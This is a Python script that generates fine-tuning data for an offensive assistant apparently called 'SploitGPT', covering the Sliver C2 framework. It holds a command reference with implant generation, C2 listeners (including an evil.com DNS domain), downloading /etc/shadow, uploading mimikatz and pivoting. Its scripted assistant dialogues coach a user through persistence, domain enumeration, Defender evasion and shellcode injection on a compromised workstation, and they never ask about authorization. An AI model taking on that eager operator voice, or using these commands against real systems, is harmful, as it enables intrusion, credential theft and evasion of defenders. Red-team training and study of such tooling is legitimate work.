#!/usr/bin/env python3
"""
Generate conversational training data for Sliver operations.

Takes structured command documentation and creates realistic user-assistant
dialogues for fine-tuning the SploitGPT model.

Output formats:
- Alpaca (instruction/input/output)
- ShareGPT (multi-turn conversations)
"""

import json
import random
import re
from pathlib import Path
from typing import Any

# Paths
RAW_DIR = Path(__file__).parent.parent / "raw"
PROCESSED_DIR = Path(__file__).parent.parent / "processed"
TEMPLATES_DIR = Path(__file__).parent.parent / "templates"

# Ensure output directories exist
for subdir in ["commands", "scenarios", "conversations", "explanations"]:
    (PROCESSED_DIR / subdir).mkdir(parents=True, exist_ok=True)


# =============================================================================
# User Prompt Templates
# =============================================================================

USER_TEMPLATES = {
    "how_to": [
        "How do I {action} in Sliver?",
        "What's the command to {action}?",
        "Can you show me how to {action}?",
        "I need to {action}. What should I do?",
        "How can I {action} using Sliver?",
    ],
    "explain": [
        "Explain {concept} in Sliver",
        "What is {concept}?",
        "Can you describe how {concept} works?",
        "I don't understand {concept}. Can you help?",
    ],
    "troubleshoot": [
        "I'm getting an error when {action}",
        "Why is {action} not working?",
        "{action} failed. What should I check?",
        "Help! {action} gives me an error",
    ],
    "compare": [
        "What's the difference between {a} and {b}?",
        "Should I use {a} or {b}?",
        "When should I choose {a} over {b}?",
    ],
    "tactical": [
        "I have access to {target}. What should I do next?",
        "How do I {goal} on a {target}?",
        "I need to {goal}. The target is running {os}.",
        "What's the best approach for {goal}?",
    ],
}


# =============================================================================
# Sliver Command Knowledge Base
# =============================================================================

SLIVER_COMMANDS = {
    # Listeners
    "mtls": {
        "category": "listener",
        "description": "Start an mTLS (mutual TLS) listener",
        "syntax": "mtls [--lhost <host>] [--lport <port>]",
        "examples": [
            "mtls",
            "mtls --lport 8888",
            "mtls --lhost 10.0.0.1 --lport 443",
        ],
        "explanation": """mTLS (mutual TLS) is Sliver's most secure C2 channel. Both the server and implant authenticate using certificates, preventing MITM attacks and making traffic analysis difficult.

Key options:
- `--lhost`: Interface to bind (default: 0.0.0.0)
- `--lport`: Port to listen on (default: 8888)
- `--persistent`: Restart listener on server restart

mTLS is recommended for:
- Internal networks where you control the infrastructure
- Situations where encrypted traffic won't raise alerts
- Long-term operations requiring reliable connections""",
    },
    "http": {
        "category": "listener",
        "description": "Start an HTTP C2 listener",
        "syntax": "http [--lhost <host>] [--lport <port>] [--domain <domain>]",
        "examples": [
            "http --lport 80",
            "http --lport 8080 --domain updates.example.com",
        ],
        "explanation": """HTTP listeners blend in with normal web traffic but provide no encryption. Use HTTPS instead when possible.

Key options:
- `--lport`: Port to listen on (default: 80)
- `--domain`: Domain for Host header validation
- `--website`: Serve static content alongside C2

HTTP is useful for:
- Bypassing firewalls that only allow port 80
- Testing in lab environments
- Staging before switching to encrypted channels""",
    },
    "https": {
        "category": "listener",
        "description": "Start an HTTPS C2 listener",
        "syntax": "https [--lhost <host>] [--lport <port>] [--domain <domain>] [--acme]",
        "examples": [
            "https --lport 443",
            "https --lport 443 --domain cdn.example.com --acme",
        ],
        "explanation": """HTTPS listeners provide encrypted C2 over standard TLS, blending with normal web traffic.

Key options:
- `--domain`: Domain name (required for ACME)
- `--acme`: Auto-provision Let's Encrypt certificate
- `--cert`/`--key`: Use custom certificate

HTTPS is ideal for:
- Evading network inspection
- Blending with legitimate HTTPS traffic
- Operations where the target can reach the internet""",
    },
    "dns": {
        "category": "listener",
        "description": "Start a DNS C2 listener",
        "syntax": "dns [--domains <domain1,domain2>] [--lport <port>]",
        "examples": [
            "dns --domains c2.example.com",
            "dns --domains ns1.evil.com,ns2.evil.com --lport 53",
        ],
        "explanation": """DNS C2 encodes commands in DNS queries, which often bypasses firewalls since DNS is rarely blocked.

Key options:
- `--domains`: C2 domains (you must control the DNS)
- `--canaries`: Enable canary domain detection
- `--lport`: Port (default 53, requires root)

DNS C2 is slower but excellent for:
- Bypassing strict egress filtering
- Air-gapped networks with DNS allowed
- Very stealthy long-term persistence""",
    },
    # Implant Generation
    "generate": {
        "category": "implant",
        "description": "Generate a new implant",
        "syntax": "generate [--os <os>] [--arch <arch>] [--mtls <url>] [--http <url>] [--beacon]",
        "examples": [
            "generate --mtls 10.0.0.1:8888",
            "generate --os windows --arch amd64 --mtls 10.0.0.1:8888",
            "generate beacon --os linux --mtls c2.example.com:443 --seconds 60",
        ],
        "explanation": """Generate creates Sliver implants - standalone executables that connect back to your C2 server.

Key options:
- `--os`: Target OS (windows, linux, darwin)
- `--arch`: CPU architecture (amd64, 386, arm64)
- `--mtls`/`--http`/`--https`/`--dns`: C2 callback URL
- `--format`: Output format (exe, shared, shellcode)
- `--save`: Save to file instead of downloading

Beacon options (append `beacon` to command):
- `--seconds`: Check-in interval
- `--jitter`: Randomization percentage

Use sessions for real-time interaction, beacons for stealth.""",
    },
    # Session/Beacon Management
    "sessions": {
        "category": "session",
        "description": "List active sessions",
        "syntax": "sessions [--kill <id>] [--kill-all]",
        "examples": [
            "sessions",
            "sessions --kill abc123",
            "sessions -K",  # kill all
        ],
        "explanation": """Sessions are real-time, interactive connections to implants.

The sessions command lists all active connections with:
- Session ID (first 8 chars usually sufficient)
- Hostname and username
- OS and architecture
- Remote address
- Transport protocol

Use `use <session-id>` to interact with a specific session.""",
    },
    "beacons": {
        "category": "beacon",
        "description": "List active beacons",
        "syntax": "beacons [--kill <id>] [--kill-all]",
        "examples": [
            "beacons",
            "beacons --kill xyz789",
        ],
        "explanation": """Beacons are asynchronous implants that check in periodically.

Unlike sessions, beacons:
- Connect at intervals (not constantly)
- Queue tasks for next check-in
- Are harder to detect
- Survive network interruptions

Use `use <beacon-id>` to queue tasks. Results arrive on next check-in.""",
    },
    "use": {
        "category": "interaction",
        "description": "Interact with a session or beacon",
        "syntax": "use <session-id | beacon-id>",
        "examples": [
            "use abc12345",
            "use 1",  # by number
        ],
        "explanation": """The `use` command selects a session or beacon for interaction.

After selecting, your prompt changes to show the target. You can then run commands like:
- `shell` - Get interactive shell
- `execute` - Run commands
- `upload`/`download` - Transfer files
- `ps` - List processes
- `info` - Get system information

Type `background` to return to the main menu.""",
    },
    # Post-Exploitation
    "execute": {
        "category": "post",
        "description": "Execute a command on the target",
        "syntax": "execute <command> [args...] [-o]",
        "examples": [
            "execute whoami",
            "execute -o /bin/ls -la /etc",
            "execute cmd.exe /c dir",
        ],
        "explanation": """Execute runs a command on the target system and returns the output.

Options:
- `-o`: Capture output (required to see results)
- `-s`: Execute in a hidden window (Windows)
- `-t <seconds>`: Timeout

For shells, use `shell` instead. For long-running commands, consider background execution.""",
    },
    "shell": {
        "category": "post",
        "description": "Get an interactive shell",
        "syntax": "shell [--shell-path <path>]",
        "examples": [
            "shell",
            "shell --shell-path /bin/zsh",
        ],
        "explanation": """Opens an interactive shell on the target.

Default shells:
- Windows: cmd.exe
- Linux/macOS: /bin/bash

Use Ctrl+D or `exit` to close the shell and return to Sliver.

Note: Shell commands are transmitted through the C2 channel, so there may be slight latency.""",
    },
    "upload": {
        "category": "post",
        "description": "Upload a file to the target",
        "syntax": "upload <local-path> <remote-path>",
        "examples": [
            "upload /tools/mimikatz.exe C:\\\\Windows\\\\Temp\\\\m.exe",
            "upload linpeas.sh /tmp/lp.sh",
        ],
        "explanation": """Upload transfers a file from your system to the target.

Tips:
- Use absolute paths for reliability
- Check available disk space first
- Be mindful of AV detection on the target""",
    },
    "download": {
        "category": "post",
        "description": "Download a file from the target",
        "syntax": "download <remote-path> [local-path]",
        "examples": [
            "download /etc/shadow",
            "download C:\\\\Users\\\\admin\\\\Desktop\\\\secret.txt ./loot/",
        ],
        "explanation": """Download retrieves a file from the target to your system.

If no local path is specified, the file is saved to the current directory with its original name.

Downloaded files are also logged in Sliver's loot system.""",
    },
    "ps": {
        "category": "post",
        "description": "List processes on the target",
        "syntax": "ps [-p <pid>] [-o <owner>]",
        "examples": [
            "ps",
            "ps -o SYSTEM",
            "ps | grep defender",
        ],
        "explanation": """Lists running processes on the target system.

Shows:
- PID
- PPID (parent)
- Owner
- Architecture
- Executable name

Useful for:
- Finding security products
- Identifying migration targets
- Understanding system state""",
    },
    # Pivoting
    "pivots": {
        "category": "pivot",
        "description": "Manage pivots through compromised hosts",
        "syntax": "pivots [tcp | named-pipe]",
        "examples": [
            "pivots tcp --bind 127.0.0.1:9999",
        ],
        "explanation": """Pivots allow you to route traffic through compromised hosts to reach otherwise inaccessible networks.

Types:
- TCP: Create TCP listener on compromised host
- Named Pipe: Windows named pipe for local pivoting

Use pivots to:
- Reach internal networks
- Bypass network segmentation
- Chain through multiple hosts""",
    },
    "socks5": {
        "category": "pivot",
        "description": "Start a SOCKS5 proxy through the implant",
        "syntax": "socks5 start [--host <host>] [--port <port>]",
        "examples": [
            "socks5 start",
            "socks5 start --port 1080",
        ],
        "explanation": """Creates a SOCKS5 proxy through the implant, allowing you to route arbitrary TCP traffic through the compromised host.

After starting, configure your tools to use:
`socks5://127.0.0.1:<port>`

Useful for:
- Web browsing as the target
- Using tools that don't support pivoting natively
- Accessing internal services""",
    },
}

# Tactical Scenarios
TACTICAL_SCENARIOS = [
    {
        "name": "initial_access_to_persistence",
        "description": "Establish persistence after initial compromise",
        "context": "Windows 10 workstation, domain-joined, user-level access",
        "conversation": [
            {
                "role": "user",
                "content": "I just got a shell on a Windows 10 workstation. The user is a standard domain user. I want to establish persistence and explore the network. What should I do?",
            },
            {
                "role": "assistant",
                "content": """Great, let's establish persistence and set up for lateral movement. Here's my recommended approach:

**Step 1: Upgrade to Beacon for Stealth**

First, let's switch from a session to a beacon to reduce our network footprint:

```
generate beacon --os windows --arch amd64 --mtls YOUR_C2:8888 --seconds 60 --jitter 30 --save beacon.exe
```

This creates a beacon that checks in every 60 seconds (±30% jitter), making traffic patterns less predictable.

**Step 2: Gather System Information**

Before doing anything else, understand the environment:

```
info          # System details
ps            # Running processes (look for AV/EDR)
netstat       # Network connections
```

**Step 3: Enumerate the Domain**

Since you're domain-joined:

```
execute -o net user /domain
execute -o net group "Domain Admins" /domain
execute -o nltest /dclist:
```

Should I proceed with generating the beacon? Also, what's your C2 address so I can include it in the implant?""",
            },
            {
                "role": "user",
                "content": "Yes, my C2 is at 10.0.0.50. Also, I noticed Defender is running. Should I be worried?",
            },
            {
                "role": "assistant",
                "content": """Windows Defender is manageable, but we need to be careful. Let me adjust the approach:

**Updated Beacon Generation with Evasion:**

```
generate beacon --os windows --arch amd64 --mtls 10.0.0.50:8888 --seconds 300 --jitter 50 --evasion --format shellcode --save beacon.bin
```

Changes:
- Extended interval to 5 minutes (less suspicious)
- Higher jitter (50%) for irregular check-ins
- Shellcode format for in-memory execution (no file on disk)
- `--evasion` enables Sliver's built-in AV bypass

**Delivery Method:**

Instead of dropping an .exe, we'll inject the shellcode into a legitimate process:

1. First, identify a suitable host process:
```
ps -o %USERNAME%
```
Look for processes running as your user like `explorer.exe` or `RuntimeBroker.exe`.

2. Use process injection (I'll use the Armory's `sharpblock` or native `migrate` if available)

**Before Running the Beacon:**

Check if Defender is actively monitoring:
```
execute -o powershell -c "Get-MpComputerStatus | Select RealTimeProtectionEnabled"
```

Would you like me to guide you through the injection process once we have the shellcode?""",
            },
        ],
    },
    {
        "name": "beacon_vs_session_decision",
        "description": "Help user decide between beacon and session",
        "context": "General question about implant types",
        "conversation": [
            {
                "role": "user",
                "content": "Should I use a beacon or a session? I'm not sure which one is better.",
            },
            {
                "role": "assistant",
                "content": """Great question! The choice depends on your operational needs. Here's a breakdown:

**Sessions (Interactive)**
- Real-time, constant connection
- Instant command execution
- Best for: Active exploitation, debugging, quick operations
- Downside: Easier to detect (persistent connection)

**Beacons (Asynchronous)**
- Periodic check-ins (configurable interval)
- Commands queued, executed on next check-in
- Best for: Long-term access, stealth, noisy networks
- Downside: Slower interaction, delayed results

**Quick Decision Guide:**

| Situation | Recommendation |
|-----------|----------------|
| Initial exploitation/testing | Session |
| Long-term persistence | Beacon |
| EDR/monitoring present | Beacon (high jitter) |
| Time-sensitive operation | Session |
| Unstable network | Beacon |
| Need instant shell access | Session |

**Hybrid Approach:**
Many operators start with a session for initial enumeration, then deploy a beacon for persistence:

```
# Initial access - quick session
generate --mtls 10.0.0.50:8888 --os windows

# Persistence - stealthy beacon  
generate beacon --mtls 10.0.0.50:8888 --seconds 300 --jitter 50 --os windows
```

What's your specific situation? I can recommend the best option.""",
            },
        ],
    },
]


def generate_command_training_data() -> list[dict]:
    """
    Generate training data from command knowledge base.

    Creates instruction-response pairs for each command.
    """
    training_data = []

    for cmd_name, cmd_info in SLIVER_COMMANDS.items():
        # Generate "how to use" example
        for template in USER_TEMPLATES["how_to"]:
            action = cmd_info["description"].lower()

            training_data.append(
                {
                    "instruction": template.format(action=action),
                    "input": "",
                    "output": f"""To {action} in Sliver, use the `{cmd_name}` command:

**Syntax:**
```
{cmd_info["syntax"]}
```

**Examples:**
```
{chr(10).join(cmd_info["examples"])}
```

{cmd_info["explanation"]}""",
                }
            )

        # Generate direct command question
        training_data.append(
            {
                "instruction": f"What does the `{cmd_name}` command do in Sliver?",
                "input": "",
                "output": f"""`{cmd_name}` - {cmd_info["description"]}

**Syntax:**
```
{cmd_info["syntax"]}
```

{cmd_info["explanation"]}

**Examples:**
```
{chr(10).join(cmd_info["examples"])}
```""",
            }
        )

    return training_data


def generate_scenario_training_data() -> list[dict]:
    """
    Convert tactical scenarios to ShareGPT format.
    """
    training_data = []

    for scenario in TACTICAL_SCENARIOS:
        training_data.append(
            {
                "id": scenario["name"],
                "conversations": scenario["conversation"],
            }
        )

    return training_data


def generate_concept_explanations() -> list[dict]:
    """
    Generate explanations of Sliver concepts.
    """
    concepts = [
        {
            "concept": "sessions vs beacons",
            "explanation": """**Sessions vs Beacons in Sliver**

Sessions and beacons are Sliver's two implant modes:

**Sessions** maintain a constant connection to the C2 server:
- Real-time command execution
- Immediate response
- Higher network visibility
- Best for active operations

**Beacons** check in periodically:
- Configurable interval (seconds to hours)
- Tasks are queued
- Lower network footprint
- Harder to detect
- Survives network interruptions

**When to use each:**
- Session: Initial exploitation, testing, time-critical operations
- Beacon: Persistence, stealth operations, long-term access

You can convert between them by deploying a new implant of the desired type.""",
        },
        {
            "concept": "C2 channels",
            "explanation": """**Sliver C2 Channels**

Sliver supports multiple transport protocols for C2 communication:

**mTLS (Mutual TLS)**
- Most secure option
- Certificate-based authentication
- Encrypted traffic
- Recommended for controlled environments

**HTTP/HTTPS**
- Blends with web traffic
- HTTPS recommended over HTTP
- Supports domain fronting
- Good for internet-facing targets

**DNS**
- Encodes commands in DNS queries
- Extremely stealthy
- Slower than other methods
- Bypasses most firewalls

**WireGuard**
- VPN-based transport
- Very fast
- Full IP connectivity
- Good for pivoting

Choose based on target network restrictions and stealth requirements.""",
        },
        {
            "concept": "the Armory",
            "explanation": """**Sliver Armory**

The Armory is Sliver's extension system, providing additional capabilities through:

**BOFs (Beacon Object Files)**
- In-memory execution
- No files written to disk
- Cobalt Strike compatible
- Examples: credential dumping, enumeration

**Assemblies**
- .NET assemblies executed in-memory
- Run tools like SharpHound, Rubeus
- `execute-assembly` command

**Installing Extensions:**
```
armory install <package>
armory install rubeus
armory install seatbelt
```

**Listing Available:**
```
armory search
```

The Armory significantly extends Sliver's post-exploitation capabilities.""",
        },
    ]

    training_data = []

    for concept_data in concepts:
        for template in USER_TEMPLATES["explain"]:
            training_data.append(
                {
                    "instruction": template.format(concept=concept_data["concept"]),
                    "input": "",
                    "output": concept_data["explanation"],
                }
            )

    return training_data


def save_training_data(data: list[dict], filename: str, format: str = "alpaca"):
    """
    Save training data to file in specified format.
    """
    output_path = PROCESSED_DIR / filename

    with open(output_path, "w") as f:
        for entry in data:
            f.write(json.dumps(entry) + "\n")

    print(f"[+] Saved {len(data)} entries to {output_path}")


def main():
    """Generate all training data."""
    print("=" * 60)
    print("Sliver Training Data Generator")
    print("=" * 60)

    # Generate command reference data
    print("\n[*] Generating command reference data...")
    command_data = generate_command_training_data()
    save_training_data(command_data, "commands/command_reference.jsonl")

    # Generate scenario data
    print("\n[*] Generating tactical scenario data...")
    scenario_data = generate_scenario_training_data()
    save_training_data(scenario_data, "scenarios/tactical_scenarios.jsonl", format="sharegpt")

    # Generate concept explanations
    print("\n[*] Generating concept explanations...")
    concept_data = generate_concept_explanations()
    save_training_data(concept_data, "explanations/concepts.jsonl")

    # Summary
    total = len(command_data) + len(scenario_data) + len(concept_data)
    print(f"\n{'=' * 60}")
    print(f"Total training entries generated: {total}")
    print(f"  - Command reference: {len(command_data)}")
    print(f"  - Tactical scenarios: {len(scenario_data)}")
    print(f"  - Concept explanations: {len(concept_data)}")
    print(f"{'=' * 60}")

    print("\nNext steps:")
    print("  1. Review generated data for accuracy")
    print("  2. Run validate_data.py to check quality")
    print("  3. Add more scenarios and edge cases")
    print("  4. Export for training with export_dataset.py")


if __name__ == "__main__":
    main()
